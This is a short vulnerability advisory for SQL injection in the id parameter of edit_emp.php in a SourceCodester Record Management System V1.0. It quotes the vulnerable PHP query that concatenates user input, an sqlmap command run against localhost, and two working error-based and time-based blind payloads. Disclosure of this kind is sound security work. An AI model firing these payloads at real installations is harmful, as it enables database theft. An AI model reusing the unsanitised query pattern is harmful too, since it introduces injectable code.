### VUL_AUTHOR:netmanzhang
# Record Management System - SQL Injection on (edit_emp.php id parameter) 
## Vendor Homepage:
https://www.sourcecodester.com/php/5107/record-management-system.html 
## Version:V1.0
## Tested on: PHP, Apache, MySQL
## Affected Page:
edit_emp.php 

On this page, id parameter is vulnerable to SQL Injection Attack 
## Source code(Personnel_record_management_system/edit_emp.php):
```
$get_id=$_GET['id'];
$name_query=mysqli_query($conn,"select * from employee where employeeID='$get_id'")or die(mysqli_error());
$name_row=mysqli_fetch_array($name_query);
```
## Proof of vulnerability(Verify using the sqlmap tool):
#### -> sqlmap -u http://localhost/Personnel_record_management_system/edit_emp.php?id=126 --batch
## Output:
```
---
Parameter: id (GET)
    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=126'||(SELECT 0x7063664a WHERE 9172=9172 AND (SELECT 2687 FROM(SELECT COUNT(*),CONCAT(0x71786b6a71,(SELECT (ELT(2687=2687,1))),0x71706b6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a))||'

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=126'||(SELECT 0x6d414649 WHERE 2807=2807 AND (SELECT 2150 FROM (SELECT(SLEEP(5)))EdbI))||'
---
```
